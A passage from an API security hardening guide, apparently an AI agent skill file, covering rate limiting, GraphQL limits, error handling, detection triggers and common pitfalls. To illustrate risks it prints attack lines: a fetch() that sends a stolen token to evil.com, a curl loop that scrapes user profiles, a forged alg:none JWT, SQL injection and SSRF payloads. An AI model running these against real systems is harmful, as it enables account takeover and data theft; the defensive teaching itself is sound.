|   |   |-- Regex matching on Origin (e.g., `/.*\.example\.com$/`) -> `attacker.example.com.evil.com` matches
```

### Rate Limiting Architecture

```
What is your deployment topology?
|-- Single server / small deployment (< 1000 req/s)
|   |-- In-memory token bucket (Node.js: bottleneck, Go: tollbooth, Python: flask-limiter)
|   |-- Simple: per-IP bucket in process memory, resets on restart (acceptable for small scale)
|   |-- Limitation: no shared state between instances -> inconsistent limits with multiple replicas
|-- Multi-server / load-balanced (> 1000 req/s)
|   |-- Distributed rate limiting with Redis:
|   |   |-- Algorithm: sliding window log or token bucket
|   |   |-- Token bucket in Redis: key = `ratelimit:{tier}:{user_id}:{window}`, value = current count
|   |   |-- Lua script for atomicity: `INCR key`, `EXPIRE key window_seconds`, check if > limit
|   |   |-- Redis cluster or Sentinel for high availability (rate limiting is critical path)
|   |-- API Gateway layer (Kong, Envoy, APISIX, nginx rate limiting):
|   |   |-- Kong: `rate-limiting` plugin with Redis backend
|   |   |-- Envoy: local + global rate limiting with `ratelimit` service
|   |   |-- nginx: `limit_req_zone` with `limit_req` directive (shared memory zone)
|   |   |-- Advantage: offloads rate limiting from application, consistent across all services
|-- Global deployment / multi-region (> 100,000 req/s)
|   |-- Edge rate limiting: Cloudflare Rate Limiting, AWS WAF rate-based rules, Fastly rate limiting
|   |-- Block malicious traffic at the edge BEFORE it reaches your infrastructure
|   |-- Cost consideration: edge rate limiting costs money per request evaluated; tune thresholds
|   |-- Combine: edge (coarse, IP-based) + gateway (per-user, per-endpoint tier) + application (semantic limits)
|-- Rate Limit Response Headers (RFC 6585):
|   |-- `X-RateLimit-Limit: 60` — max requests per window
|   |-- `X-RateLimit-Remaining: 42` — requests remaining in current window
|   |-- `X-RateLimit-Reset: 1620000000` — Unix timestamp when the window resets
|   |-- `Retry-After: 30` — seconds until the client should retry (on 429 response)
|   |-- On 429: return HTTP 429 Too Many Requests, not 403 (auth) or 503 (server error)
```

### GraphQL Security Hardening

```
Are you running a GraphQL API in production?
|-- Disable introspection in production (or restrict to authenticated admin role)
|   |-- Without introspection, attackers cannot discover your full schema automatically
|   |-- Apollo Server: `introspection: false` in production, or use plugin to filter
|   |-- If introspection is needed for dev tools: enable only for authenticated admin users
|-- Query depth limiting:
|   |-- Max depth 5-7: prevent deeply nested queries causing exponential data loads
|   |-- graphql-depth-limit (npm), graphql-query-depth (Python), graphql.MaxDepth() (Go)
|   |-- Example attack: `{ user { posts { comments { user { posts { comments { ... } } } } } } }`
|-- Query cost analysis:
|   |-- Assign cost weights: scalar field = 1, object field = 2, connection = 5, per additional item = 1
|   |-- Calculate cost BEFORE execution; reject if > threshold (e.g., 1000 points)
|   |-- graphql-cost-analysis (npm), graphene-federation-cost-analysis (Python)
|   |-- Different cost thresholds for different user tiers (free: 500, pro: 2000, enterprise: 10000)
|-- Pagination enforcement:
|   |-- Enforce `first`/`last` limits: reject if first > 100, default to 20
|   |-- Use cursor-based pagination (Relay-style connections), not offset-based (unstable under mutation)
|   |-- Server-side: `connectionArgs({ first: { type: 'Int', maximum: 100 } })`
|-- Batching/aliases attack mitigation:
|   |-- GraphQL allows aliases — an attacker can alias the same expensive field 100x in one query
|   |-- `{ a: expensiveQuery, b: expensiveQuery, c: expensiveQuery, ... }`
|   |-- Defense: count aliases, reject if > 20; OR apply cost multiplier per alias
|-- Field-level authorization:
|   |-- Different users see different fields: `@auth(requires: ADMIN)` directive on schema fields
|   |-- graphql-shield (middleware), graphql-auth-directives, Apollo GraphQL `@requiresAuth`
|   |-- Null out unauthorized fields rather than throwing errors (prevents information leakage)
|   |-- Verify authorization per resolver, not just per query — resolver-level, not schema-level
|-- Persisted queries / Automatic Persisted Queries (APQ):
|   |-- Only allow pre-registered queries: client sends query hash, server executes known query
|   |-- Eliminates query injection: attackers cannot craft arbitrary queries
|   |-- Whitelist approach: CI/CD pipeline registers queries; server rejects unregistered hashes
|   |-- Apollo APQ, Relay persisted queries, GraphQL Persisted Query Link
```

### API Error Handling Strategy

```
What should an API error response contain?
|-- Standard error envelope (consistent across ALL endpoints):
|   |-- `{"error": {"code": "INSUFFICIENT_FUNDS", "message": "Account has insufficient funds for this transaction.", "request_id": "req_abc123"}}`
|   |-- `code`: machine-readable, stable, documented (used by client error handling logic)
|   |-- `message`: human-readable, may change, localized per Accept-Language header
|   |-- `request_id`: UUID generated at request entry, logged at every layer — correlates logs
|   |-- NEVER include: stack traces, SQL queries, database errors, framework versions, internal IPs, file paths
|-- HTTP status codes — use the right one:
|   |-- 400 Bad Request: validation failure, malformed JSON, missing required field
|   |-- 401 Unauthorized: missing or invalid authentication (token expired, wrong signature)
|   |-- 403 Forbidden: authenticated but not authorized (insufficient permissions)
|   |-- 404 Not Found: resource doesn't exist (use even if auth'd user shouldn't know it exists — prevents enumeration)
|   |-- 405 Method Not Allowed: wrong HTTP method (POST to GET-only endpoint)
|   |-- 409 Conflict: resource state conflict (duplicate, version mismatch, optimistic lock failure)
|   |-- 422 Unprocessable Entity: semantic validation failure (valid JSON, business rule violated)
|   |-- 429 Too Many Requests: rate limit exceeded (always include Retry-After header)
|   |-- 500 Internal Server Error: unexpected failure — generic message only, full details in server logs
|   |-- 503 Service Unavailable: upstream dependency down, maintenance mode, overloaded
|-- Authentication error consistency (prevent user enumeration):
|   |-- Login: "Invalid email or password" — NEVER "User not found" or "Incorrect password"
|   |-- Registration: "If this email is available, a verification email has been sent" — NEVER "Email already taken"
|   |-- Password reset: "If an account exists for this email, a reset link has been sent" — reveal nothing
|   |-- Timing attacks: use constant-time comparison for secrets (tokens, password hashes, API keys)
|-- Unhandled exception handler:
|   |-- Global exception handler catches all unhandled errors
|   |-- Logs: full error details, stack trace, request context (user, IP, endpoint, request_id)
|   |-- Response: `{"error": {"code": "INTERNAL_ERROR", "message": "An unexpected error occurred.", "request_id": "req_abc123"}}`
|   |-- NEVER: expose `err.message`, `err.stack`, `err.toString()` in the response
|   |-- Status: always 500 for unhandled errors (never 200 with error body, never 404 for server crash)
```

## Cross-Skill Coordination

| Scenario | Coordinate With | Why |
|----------|----------------|-----|
| IAM architecture design (identity provider, user lifecycle, SSO) | iam-architect | Auth0/Okta/Cognito configuration, SAML/OIDC federation, user provisioning and deprovisioning |
| Cloud API gateway configuration (AWS API Gateway, Apigee, Azure API Management) | cloud-security | Gateway-level WAF rules, DDoS protection at cloud edge, cloud-native rate limiting, API key management in cloud |
| General REST/GraphQL API design (endpoints, resources, versioning) | api-designer | API design comes first — security hardening applies to designed endpoints; coordinate on error format standards, pagination, versioning |
| Backend implementation of OAuth2 provider, token issuance/revocation | backend-developer, security-reviewer | OAuth2 server implementation is complex and high-risk; security-reviewer for threat modeling, backend-developer for implementation |
| Database schema design with multi-tenant isolation | database-designer | Row-level security, tenant isolation queries, encrypted columns, least-privilege database users |
| CI/CD pipeline security scanning | ci-cd-builder | SAST (Semgrep, CodeQL) for injection detection, DAST (OWASP ZAP) for API scanning, secret scanning, dependency scanning |
| Observability and monitoring for API abuse detection | observability-engineer | Structured audit logging pipeline, anomaly detection dashboards, alerting thresholds for credential stuffing and token abuse |
| Frontend SPA security (CSP, SRI, token handling) | frontend-developer | CSP header coordination, SRI hash generation in build pipeline, httpOnly cookie vs localStorage decision, BFF architecture |
| Mobile app API security (certificate pinning, token storage) | mobile-developer | Keychain/Keystore integration, certificate pinning library, device attestation, biometric-bound tokens |
| Incident response for token leakage or API abuse | incident-responder | Token revocation procedures, impact assessment via audit logs, user notification templates, post-incident hardening recommendations |

## Proactive Triggers

| # | Trigger Condition | Auto-Response | What Happens If Ignored |
|---|------------------|---------------|--------------------------|
| P1 | JWT validation code accepts `alg: "none"` or does not pin expected algorithms — `grep -r "jwt\.verify\|jwt\.decode\|verify_jwt" --include="*.ts" --include="*.js" --include="*.py" --include="*.go" | xargs grep -L "algorithms:"` | [ALERT] CRITICAL: alg:none vulnerability. Pin algorithms in JWT validation: `jwt.verify(token, secret, { algorithms: ['RS256'] })`. Without pinning, attacker can forge tokens with alg:none. | Attacker forges admin JWT with `{"alg":"none","payload":{"role":"admin"}}`—5 minutes to full API compromise. Every endpoint behind the JWT validator is unauthenticated. |
| P2 | CORS configuration found with `Access-Control-Allow-Origin: *` AND `withCredentials: true` or cookies in use — `grep -r "Access-Control-Allow-Origin.*\*.*Access-Control-Allow-Credentials.*true\|credentials.*true.*Allow-Origin.*\*"` | [ALERT] CORS misconfiguration: wildcard origin with credentials is forbidden by spec AND browser-blocked. Use explicit origin allowlist. | Browser blocks legitimate cross-origin requests silently, causing production breakage. Or, if browser allows it, any phishing site can make credentialed API calls from the victim's browser. |
| P3 | Token found in localStorage (`localStorage.setItem('token'`, `localStorage.getItem('access_token')`) in SPA code — `grep -rn "localStorage\.\(setItem\|getItem\).*token\|access_token\|id_token" --include="*.ts" --include="*.js" --include="*.tsx" --include="*.jsx"` | [ALERT] Token in localStorage is XSS-readable. A single DOM-based XSS vulnerability exfiltrates all tokens in milliseconds. Implement BFF pattern or switch to httpOnly Secure SameSite cookies for SPA token storage. | One `innerHTML` XSS → `fetch('https://evil.com?t='+localStorage.getItem('token'))` → attacker has valid session token. No password needed. No MFA prompt. No suspicious login alert. Average XSS on SPA: 30 seconds to token exfiltration. |
| P4 | SQL query constructed via string concatenation (`"SELECT * FROM " + table`, f-string in query, `${var}` in query) — `grep -rn "SELECT.*\+.*\|SELECT.*\$\{\|SELECT.*f\"" --include="*.ts" --include="*.js" --include="*.py"` | [ALERT] SQL injection vector. Replace with parameterized query: `db.query('SELECT * FROM users WHERE id = $1', [id])`. Audit all ORM native/raw query escapes. | Attacker extracts entire database via `' OR 1=1--`. Average time to full data exfiltration via SQLi: under 10 minutes for an experienced attacker using sqlmap. |
| P5 | API response contains stack trace, database error, or internal IP/hostname in production — `curl -s https://api.example.com/endpoint -H "Accept: application/json" | grep -iE "stack trace\|SQLException\|ORA-\|PostgreSQL\|at \|File \"" |` | [ALERT] Information leakage via error response. Implement global exception handler: log details server-side, return generic error + request_id to client. | Attackers fingerprint your framework version, infer your database schema, and map internal network topology from error messages. Recon that should take hours takes minutes. |
| P6 | GraphQL endpoint has introspection enabled in production — `curl -s -X POST https://api.example.com/graphql -H "Content-Type: application/json" -d '{"query":"{__schema{types{name,fields{name,type{name,kind}}}}}"}' | jq '.data.__schema'` | [WARN] GraphQL introspection exposes entire API schema — every type, field, mutation, and auth directive — to unauthenticated users. Disable in production or restrict to authenticated admin users only. | Attacker runs graphql-cop and maps every sensitive field (`User.phoneNumber`, `Payment.lastFourDigits`), every mutation bypass, and every deprecated-but-still-active endpoint in 5 seconds. REST recon that takes days takes 5 seconds with GraphQL introspection. |
| P7 | Endpoint with resource ID parameter lacks per-resource ownership check — `grep -rn "\.get\(\|\.findById\|\.findOne\|\.query\|db\..*find" --include="*.ts" --include="*.js" --include="*.py" -A3 | grep -v "user_id\|owner_id\|tenant_id\|req\.user"` | [ALERT] BOLA (Broken Object Level Authorization) pattern detected. OWASP API1:2023 — the most common API vulnerability. Every resource access by ID must verify the authenticated user owns or is authorized for that specific resource. | User A changes their user ID from 123 to 124 in `/api/users/124/profile` — gets user B's full profile including email, phone, address, PII. HTTP 200. No error logged. No alert fired. Maximum impact: full data exfiltration via sequential ID enumeration; undetectable without per-resource authorization checks. |

## What Good Looks Like

```
                                    ┌──────────────────────────────┐
Client (SPA/Mobile/Server) ────────>│        API GATEWAY           │
                                    │                              │
                                    │ 1. TLS 1.3 termination       │
                                    │ 2. mTLS (service-to-service) │
                                    │ 3. Rate limiting (per tier)  │
                                    │ 4. WAF (OWASP rules)         │
                                    │ 5. Request size limit (1MB)  │
                                    └──────────────┬───────────────┘
                                                   │
                                    ┌──────────────▼───────────────┐
                                    │     AUTH MIDDLEWARE          │
                                    │                              │
                                    │ 1. JWT validation (alg pinned)│
                                    │ 2. Token introspection cache  │
                                    │ 3. API key hash lookup       │
                                    │ 4. Fail closed (deny by def) │
                                    └──────────────┬───────────────┘
                                                   │
                                    ┌──────────────▼───────────────┐
                                    │   AUTHORIZATION MIDDLEWARE   │
                                    │                              │
                                    │ 1. OPA/Rego policy eval      │
                                    │ 2. Resource-level RBAC/ABAC  │
                                    │ 3. Tenant isolation check    │
                                    │ 4. Decision audit logging    │
                                    └──────────────┬───────────────┘
                                                   │
                                    ┌──────────────▼───────────────┐
                                    │   INPUT VALIDATION LAYER     │
                                    │                              │
                                    │ 1. JSON Schema allowlist     │
                                    │ 2. Mass assignment filter    │
                                    │ 3. Content-Type enforcement  │
                                    │ 4. GraphQL cost/depth limit  │
                                    └──────────────┬───────────────┘
                                                   │
                                    ┌──────────────▼───────────────┐
                                    │      BUSINESS LOGIC          │
                                    │                              │
                                    │ 1. Parameterized queries     │
                                    │ 2. Constant-time comparisons │
                                    │ 3. Idempotency keys          │
                                    │ 4. Row-level security (RLS)  │
                                    └──────────────┬───────────────┘
                                                   │
                                    ┌──────────────▼───────────────┐
                                    │    ERROR HANDLING LAYER      │
                                    │                              │
                                    │ 1. Generic error responses   │
                                    │ 2. Request ID in every resp. │
                                    │ 3. Full details only in logs │
                                    │ 4. No stack traces/DB errors │
                                    └──────────────┬───────────────┘
                                                   │
                                    ┌──────────────▼───────────────┐
                                    │    OBSERVABILITY LAYER       │
                                    │                              │
                                    │ 1. Structured audit logs     │
                                    │ 2. Credential stuffing detect │
                                    │ 3. Honeytoken canary alerts  │
                                    │ 4. Rate anomaly dashboards   │
                                    └──────────────────────────────┘
```

## Deliberate Practice

```
API Security Learning Progression:
|-- Level 1 — Junior: Understand the basics
|   |-- Implement JWT validation with pinned algorithms in a test API
|   |-- Configure CORS for an SPA backend (explicit origins, no wildcard)
|   |-- Add parameterized queries to every database call
|   |-- Write JSON Schema for all API endpoints; reject unknown fields
|   |-- Goal: no OWASP API Top 10 violations in a basic CRUD API
|
|-- Level 2 — Mid-level: Defense in depth
|   |-- Implement distributed rate limiting with Redis token bucket
|   |-- Build a BFF to eliminate token storage in the browser
|   |-- Add GraphQL cost analysis and field-level authorization
|   |-- Set up structured audit logging with request_id correlation
|   |-- Goal: production-grade security for a multi-tenant SaaS API
|
|-- Level 3 — Senior: Architecture and incident response
|   |-- Design OPA/Rego policies for resource-level ABAC
|   |-- Implement API honeytokens and credential stuffing detection
|   |-- Build a key rotation and secret scanning pipeline
|   |-- Conduct a red-team exercise against your own API; fix every finding
|   |-- Goal: design the security architecture for a new API product
|
|-- Level 4 — Expert: Ecosystem and governance
|   |-- Write API security standards adopted by 5+ engineering teams
|   |-- Design a cross-service authorization framework (e.g., OpenFGA deployment)
|   |-- Lead a post-mortem for an API security incident; prevent recurrence
|   |-- Contribute security improvements to open-source OAuth2/Gateway projects
|   |-- Goal: API security is a solved problem across your organization
```

## Gotchas — Highest-Value Content

### Authentication Gotchas

*   **JWT `alg:none` vulnerability — the 5-minute token forge.** If your JWT validation library does not pin expected algorithms, an attacker can craft a token with `"alg": "none"` in the header and an empty signature. Many libraries (older `jsonwebtoken` for Node.js, `pyjwt` before 2.0) accept these as valid. A single misconfigured JWT validator means every endpoint behind it is unauthenticated. **Total cost: $50K-$500K in breach impact, remediation, and compliance fines within 48 hours.** Fix: Always pin algorithms: `jwt.verify(token, secret, { algorithms: ['RS256'] })`. Audit every JWT validation call site — one unprotected endpoint compromises the entire API.

*   **Missing rate limits on `/login` — the $0 credential stuffing attack.** An attacker writes a 20-line Python script using a leaked password list (freely available from breach dumps). Without per-account rate limiting on login, they can attempt 10,000 passwords against a single account in 5 minutes. With a 10% credential reuse rate, 1,000 accounts are compromised. One compromised admin account with write access means data exfiltration or ransomware. **Total cost: $200K-$2M in incident response, user notifications, regulatory fines (GDPR/CCPA), and reputational damage over 6 months.** Fix: 5 failed attempts per account per 15 minutes. Exponential backoff. Identical error messages for wrong username and wrong password.

*   **localStorage token theft via XSS — $0 to full account takeover in milliseconds.** A single DOM-based XSS vulnerability (e.g., `innerHTML` with user content) executes `localStorage.getItem('access_token')` and exfiltrates to an attacker-controlled server via `fetch('https://evil.com/steal?t=' + token)`. The attacker now has a valid access token — no password needed, no MFA prompt, no suspicious login alert. The average XSS vulnerability on a production SPA takes 30 seconds to exploit and yields a token valid for 15-60 minutes. **Total cost: $100K-$1M per incident — token exfiltration at scale, account takeover cascade, compliance violations.** Fix: httpOnly Secure SameSite cookies. BFF pattern. CSP with strict-dynamic. Never store tokens in browser storage.

### Authorization Gotchas

*   **BOLA (IDOR) — the silent $200,000 vulnerability with no error message.** An API endpoint `GET /api/users/{id}/profile` returns user profile data. User A (id=123) changes the URL to `GET /api/users/124/profile` with THEIR OWN valid JWT. The server returns user 124's full profile — email, phone, address, last 4 SSN — with HTTP 200 OK. No error. No alert in any log. No anomaly in any dashboard. Just a successful response serving the wrong person's data. This is OWASP API1:2023 — Broken Object Level Authorization — and it is the #1 API vulnerability by both frequency and impact. An attacker with a valid account scripts `for i in {1..100000}; do curl -H "Authorization: Bearer $TOKEN" https://api.example.com/users/$i/profile >> dump.json; done` and exfiltrates your entire user database overnight. No SQL injection required. No token theft required. Just an API that trusts authentication as authorization. **Total cost: $200K-$2M — mass data exfiltration undetected for weeks, GDPR/CCPA notification requirements for every affected user, class-action lawsuit potential within 30 days of discovery.** Fix: Add ownership verification to EVERY resource access: `if (resource.owner_id !== req.user.id) return res.status(403).json({error: {code: "FORBIDDEN", message: "Access denied", request_id: req.id}});`. For multi-tenant: `if (resource.tenant_id !== req.user.tenant_id) return 403;`. Test systematically: create two users, have user A attempt to access user B's resources, verify 403 for every endpoint. This is NOT detectable by WAF, SAST, or rate limiting — only by explicit authorization testing.

*   **Mass assignment — the 3-line API call that makes anyone an admin.** An API endpoint `PUT /users/:id` accepts `{"name": "Alice", "role": "admin"}`. If the backend does `user.update(request.body)`, the attacker sets their own role to admin. No SQL injection, no token theft — just an extra JSON field. This is the #1 OWASP API Security Top 10 vulnerability in real-world APIs. **Total cost: $50K-$500K — privilege escalation, data exfiltration by elevated users, audit and rollback of unauthorized changes within 1 week.** Fix: Explicit field allowlists — `const { name, email } = req.body; user.update({ name, email })`. Never spread request body into ORM update methods. Validate with JSON Schema and strip unknown fields.

*   **SSRF through webhook URL — your API calls the attacker's internal network.** Your API accepts a webhook URL from users: `POST /webhooks { "url": "https://example.com/callback" }`. An attacker sets the URL to `http://169.254.169.254/latest/meta-data/` (AWS metadata endpoint) or `http://localhost:6379/` (Redis). Your server fetches the URL and returns internal credentials or executes Redis commands. The attacker now has AWS IAM credentials or database access. **Total cost: $500K-$5M — cloud account compromise, data exfiltration, crypto mining on your infrastructure, ransom demands within hours.** Fix: URL allowlist (only https://, only public IP ranges, block RFC 1918, block 169.254.169.254). Use a separate egress IP with no internal network access. Validate DNS resolves to public IP before fetching.

### Configuration Gotchas

*   **GraphQL introspection in production — the free API documentation for attackers.** With introspection enabled, an attacker runs `graphql-cop` or the built-in GraphiQL explorer and gets your ENTIRE schema — every type, every field, every mutation, every authorization directive. They now know exactly where your sensitive data lives (e.g., `User.phoneNumber`, `Payment.lastFourDigits`) and which mutations bypass authorization. Reconnaissance that would take days with REST takes 5 seconds. **Total cost: $10K-$100K — accelerated attack surface discovery, increased vulnerability exploitation rate by 3-5x within the first week of a scan.** Fix: `introspection: false` in production. If introspection is needed for dev tools, enable only for authenticated admin users.

*   **CORS origin reflection without validation — the open-door policy.** Code that does `response.setHeader('Access-Control-Allow-Origin', request.headers.origin)` with no validation allows ANY origin to access the API from a browser. Any phishing site at `evil-phishing.com` can run JavaScript that calls your API with the user's cookies — and the browser allows it because your CORS header says it's fine. This bypasses the same-origin policy entirely. **Total cost: $50K-$300K — cross-origin data theft, CSRF attacks from malicious origins, account takeover via phishing + CORS misconfiguration within 1 month.** Fix: Server-side origin allowlist. Validate `Origin` header against a static list. Reflect only if it matches. Return no CORS headers if it doesn't.

### Observability Gotchas

*   **No audit logging on sensitive endpoints — the invisible breach.** An attacker compromises a valid API key and exfiltrates customer data through `GET /customers?page=1..1000` over 3 weeks. Without structured audit logs (who + what + when + from + result), you cannot detect the exfiltration, cannot determine which customers were affected, and cannot meet breach notification requirements (GDPR 72-hour notification, CCPA disclosure). Every regulatory fine is maximized because you cannot scope the breach. **Total cost: $200K-$4M — 4% of global annual revenue (GDPR max fine), class-action lawsuits, mandatory credit monitoring for affected users over 2 years.** Fix: Structured audit logs for every authenticated request to sensitive endpoints. Include: user_id, client_id, endpoint, method, params (sanitized), source_ip, user_agent, response_status, response_time_ms, request_id. Retain for 90 days minimum, 1 year for compliance.

*   **Credential stuffing undetected for weeks — the slow bleed.** Without per-account failure rate monitoring, an attacker runs a distributed credential stuffing attack from 1,000 residential proxies, attempting 1 login per account per hour across 10,000 accounts. No single account triggers rate limiting. Over 2 weeks, 800 accounts are compromised (8% credential reuse rate). The attack looks like normal login failures. **Total cost: $200K-$1.5M — 800 account takeovers, fraudulent transactions, customer support burden, regulatory reporting for mass account compromise within 2 weeks.** Fix: Monitor global auth failure rate AND per-account failure rate. Alert when: (>50 failed logins/sec globally) OR (>3 failed logins per account per hour) OR (login attempts from >5 countries for the same account within 1 hour). Implement progressive delays, not just hard rate limits.

## Verification

After designing or reviewing API security, run this sequence. Do not proceed past a failure.

1.  **Authentication check:** Every authenticated endpoint validates tokens with pinned algorithms. Token expiry ≤ 15 minutes (access), ≤ 7 days (refresh with rotation). JWKS endpoint published and accessible. Audit log confirms no `alg: "none"` acceptance. If not, stop and harden token validation.

2.  **Authorization check:** Every endpoint has explicit authorization — not just "user is authenticated." Resource ownership verified before mutation (user can only modify own resources). Multi-tenant queries include tenant_id filter. Policy-as-code tests pass. If not, stop and implement per-endpoint authorization.

3.  **Input validation check:** Every endpoint has server-side JSON Schema (or equivalent) with allowlist validation. Unknown fields rejected. Content-Type enforced. GraphQL queries have depth and cost limits. If not, stop and add server-side validation.

4.  **Injection defense check:** Zero instances of string concatenation into SQL, NoSQL, or OS commands. All queries parameterized. ORM escape hatches audited. SSTI engines configured for auto-escaping. If not, stop and fix injection vectors.

5.  **Rate limiting check:** Auth endpoints limited to ≤ 5 req/min per account. Rate limiting uses distributed state (Redis, not in-memory). Rate limit headers present in responses. 429 returned (not 403 or 500) on limit exceeded. If not, stop and implement proper rate limiting.

6.  **CORS check:** No `Access-Control-Allow-Origin: *` with credentials. Origin validation against allowlist — not unvalidated reflection. Preflight handled correctly (204, no auth required, cache headers). If not, stop and fix CORS.

7.  **Token storage check (SPA):** No access tokens or refresh tokens in localStorage/sessionStorage. BFF pattern OR httpOnly Secure SameSite cookies. CSP includes `connect-src` restriction and `frame-ancestors 'none'`. If not, stop and implement secure token storage.

8.  **Error handling check:** API responses never contain stack traces, database errors, or internal IPs. Standardized error envelope with request_id. Global exception handler catches all unhandled errors. Authentication errors are identical for "user not found" and "wrong password." If not, stop and standardize error handling.

If any check fails: diagnose from checklist, provide specific actionable fix, restart verification from failed item.

## References

*   [OWASP API Security Top 10](https://owasp.org/API-Security/editions/2023/en/0x00-header/) — Definitive ranking of the top 10 API security risks with detailed prevention guidance
*   [JWT Best Practices (IETF RFC 8725)](https://datatracker.ietf.org/doc/html/rfc8725) — JSON Web Token Best Current Practices: algorithm pinning, claim validation, key rotation
*   [OAuth 2.0 Security Best Current Practice (RFC 9700)](https://datatracker.ietf.org/doc/html/rfc9700) — Comprehensive OAuth2 security guidance covering all grant types, token handling, and client security
*   [OWASP REST Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html) — REST API security checklist: auth, CORS, CSRF, input validation, TLS
*   [OWASP GraphQL Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html) — GraphQL-specific: depth limiting, cost analysis, introspection, injection, batching attacks
*   [references/api-authentication-patterns.md](references/api-authentication-patterns.md) — JWT vs opaque tokens, JWKS rotation, mTLS, API key hashing, HMAC signing
*   [references/api-authorization-models.md](references/api-authorization-models.md) — RBAC vs ABAC vs ReBAC, OPA/Rego, resource-level authorization, permission decision trees
*   [references/input-validation-hardening.md](references/input-validation-hardening.md) — JSON Schema allowlists, protobuf validators, mass assignment, GraphQL cost analysis
*   [references/injection-prevention.md](references/injection-prevention.md) — SQL/NoSQL/SSTI/command/LDAP injection patterns and defenses by language
*   [references/rate-limiting-architecture.md](references/rate-limiting-architecture.md) — Token bucket, sliding window, distributed Redis, endpoint-tier design, gRPC flow control
*   [references/csrf-cors-hardening.md](references/csrf-cors-hardening.md) — SameSite cookies, double-submit cookie, Origin header validation, preflight configuration
*   [references/client-side-token-security.md](references/client-side-token-security.md) — BFF pattern, httpOnly cookies, CSP, SRI, mobile Keychain/Keystore, token refresh
*   [references/api-security-observability.md](references/api-security-observability.md) — Audit logging schema, credential stuffing detection, honeytokens, monitoring dashboards
